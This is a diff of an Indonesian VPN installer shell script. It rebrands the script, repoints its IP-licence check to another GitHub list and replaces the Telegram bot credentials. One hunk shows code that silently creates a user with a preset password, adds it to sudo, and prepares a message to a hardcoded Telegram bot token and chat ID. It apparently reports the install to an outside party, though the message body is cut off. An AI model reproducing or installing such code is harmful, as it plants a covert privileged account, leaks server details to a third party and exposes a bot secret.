@@ -99,11 +99,11 @@ VALIDITY () {
 	VERSIONSC
     else
     echo -e "\e[31mScript Anda Telah Expired !!\e[0m";
-    echo -e "\e[31mTolong Renew Script di  @huutvpn\e[0m"
+    echo -e "\e[31mTolong Renew Script di  @admin\e[0m"
     exit 0
 fi
 }
-IZIN=$(curl https://raw.githubusercontent.com/SETANTAZVPN/ip/main/ip | awk '{print $5}' | grep $MYIP)
+IZIN=$(curl https://raw.githubusercontent.com/huutvpn/ip/main/ip | awk '{print $5}' | grep $MYIP)
 if [ $MYIP = $IZIN ]; then
 echo -e "\e[32mPERMISSION ACCEPT...\e[0m"
 sleep 3
@@ -264,7 +264,7 @@ else
 fi
 }
 
-# HUUTVPN
+# GEMOY
 clear
 function nginx_install() {
     # // Checking System
@@ -379,8 +379,8 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="6061644931"
-    KEY="6406070059:AAFIpAWnbnnuikvxeWgz4rJwA5SrCVYe5VA"
+    CHATID="21057557"
+    KEY="57509226:AAFM9zBAk8nVl4zTINU1SakYULxH0_P0U"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT="Installasi VPN Script Stable V3.0
